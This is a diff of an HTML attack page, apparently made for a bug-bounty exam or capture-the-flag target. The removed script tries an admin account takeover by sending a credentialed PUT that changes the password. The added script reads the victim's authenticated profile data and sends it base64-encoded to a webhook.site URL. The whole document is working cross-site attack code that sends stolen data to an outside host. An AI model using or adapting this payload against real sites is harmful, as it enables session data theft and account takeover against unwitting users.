@@ -2,33 +2,21 @@
 <html>
 <body>
     <script>
-        const apiBase = "https://api-bugbounty-exam.hashacademy.co";
+    async function leakFlag() {
         const webhook = "https://webhook.site/0279174a-c77a-4643-aa9c-0251998890b0";
+        const api = "https://api-bugbounty-exam.hashacademy.co/api/auth/me";
 
-        async function performATO() {
-            try {
-                // Attempt to change the admin's password
-                // We guess the endpoint based on the User ID you found
-                const response = await fetch(`${apiBase}/api/auth/profile`, {
-                    method: "PUT",
-                    headers: { "Content-Type": "application/json" },
-                    credentials: "include",
-                    body: JSON.stringify({
-                        fullName: "Saja_Admin",
-                        password: "PwnedPassword123!" 
-                    })
-                });
-
-                const result = await response.json();
-                
-                // Send the result to your webhook so you know if it worked
-                fetch(`${webhook}?ato_status=${btoa(JSON.stringify(result))}`);
-            } catch (e) {
-                fetch(`${webhook}?error=${btoa(e.message)}`);
-            }
+        try {
+            const res = await fetch(api, {credentials: "include"});
+            const data = await res.text();
+            
+            // This sends the data as a URL parameter, bypassing POST body issues
+            window.location.href = webhook + "?data=" + btoa(data);
+        } catch (e) {
+            window.location.href = webhook + "?err=" + btoa(e.message);
         }
-
-        performATO();
-    </script>
+    }
+    leakFlag();
+</script>
 </body>
 </html>
